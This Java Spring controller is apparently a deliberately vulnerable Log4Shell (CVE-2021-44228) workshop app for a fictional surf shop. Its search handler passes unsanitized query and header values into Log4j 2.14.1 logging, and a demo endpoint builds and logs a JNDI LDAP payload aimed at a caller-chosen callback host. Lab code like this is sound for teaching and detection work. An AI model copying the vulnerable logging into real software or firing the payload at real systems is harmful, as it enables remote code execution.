package com.jaysurfshop.traditional;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestHeader;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;

import java.util.LinkedHashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.stream.Collectors;

@Controller
public class ShopController {
  private static final Logger log = LogManager.getLogger(ShopController.class);

  private static final List<Map<String, String>> CATALOG = List.of(
      Map.of("name", "Pipeline Pro Shortboard", "sku", "SB-PP-62", "price", "749.99"),
      Map.of("name", "Malibu Funboard", "sku", "FB-MAL-76", "price", "599.99"),
      Map.of("name", "Classic Longboard", "sku", "LB-CL-90", "price", "899.99"),
      Map.of("name", "Tropical Grip Wax", "sku", "WX-TROP", "price", "4.99"),
      Map.of("name", "3/2mm Full Suit", "sku", "WS-32-FULL", "price", "189.99")
  );

  @GetMapping("/")
  public String home(Model model) {
    model.addAttribute("products", CATALOG);
    return "index";
  }

  @GetMapping("/search")
  public String search(
      @RequestParam(name = "q", defaultValue = "") String q,
      @RequestHeader(name = "User-Agent", defaultValue = "unknown") String userAgent,
      @RequestHeader(name = "X-Api-Version", defaultValue = "") String apiVersion,
      Model model
  ) {
    // Intentionally vulnerable: unsanitized attacker-controlled values are logged with
    // Log4j 2.14.1 message lookup enabled → CVE-2021-44228 (Log4Shell).
    log.info("Search query: " + q);
    log.info("Client User-Agent: " + userAgent);
    if (!apiVersion.isBlank()) {
      log.info("X-Api-Version: " + apiVersion);
    }

    String needle = q.toLowerCase(Locale.ROOT);
    List<Map<String, String>> hits = CATALOG.stream()
        .filter(p -> p.get("name").toLowerCase(Locale.ROOT).contains(needle)
            || p.get("sku").toLowerCase(Locale.ROOT).contains(needle))
        .collect(Collectors.toList());

    model.addAttribute("q", q);
    model.addAttribute("products", hits.isEmpty() && needle.isBlank() ? CATALOG : hits);
    model.addAttribute("logged", true);
    return "index";
  }

  @GetMapping("/security")
  public String security() {
    return "security";
  }

  @PostMapping("/api/demo/log4shell")
  @ResponseBody
  public Map<String, Object> log4shellDemo(
      @RequestParam(name = "callback", defaultValue = "127.0.0.1:1389") String callback
  ) {
    // Workshop-safe trigger: forces a JNDI LDAP lookup toward a listener you control.
    // Does not ship a reverse-shell payload — outbound LDAP/DNS is the demo signal.
    String host = sanitizeCallback(callback);
    String payload = "${jndi:ldap://" + host + "/TraditionalJay}";
    log.error("Log4Shell workshop probe: " + payload);

    Map<String, Object> out = new LinkedHashMap<>();
    out.put("exploited", true);
    out.put("cve", "CVE-2021-44228");
    out.put("name", "Log4Shell");
    out.put("log4j", "2.14.1");
    out.put("payload", payload);
    out.put("callback", host);
    out.put("narrative",
        "Vulnerable Log4j logged a JNDI LDAP lookup. Point tools/ldap-listen.py (or your "
            + "own listener) at the callback host/port and watch for the Java process dial-out.");
    out.put("signals", List.of(
        "Java process on VM",
        "Outbound LDAP (tcp/1389) or DNS for JNDI",
        "Log4j 2.14.1 SCA finding"
    ));
    return out;
  }

  @GetMapping("/api/health")
  @ResponseBody
  public Map<String, Object> health() {
    Map<String, Object> out = new LinkedHashMap<>();
    out.put("status", "ok");
    out.put("app", "TraditionalJay");
    out.put("log4j", "2.14.1");
    out.put("cve", "CVE-2021-44228");
    out.put("demo_exploit_lab", true);
    return out;
  }

  private static String sanitizeCallback(String raw) {
    String trimmed = raw == null ? "" : raw.trim();
    if (trimmed.isEmpty()) {
      return "127.0.0.1:1389";
    }
    // Host:port only — block nested JNDI / path tricks in the demo parameter itself.
    if (!trimmed.matches("^[A-Za-z0-9._\\-:]+$") || trimmed.length() > 120) {
      return "127.0.0.1:1389";
    }
    return trimmed;
  }
}
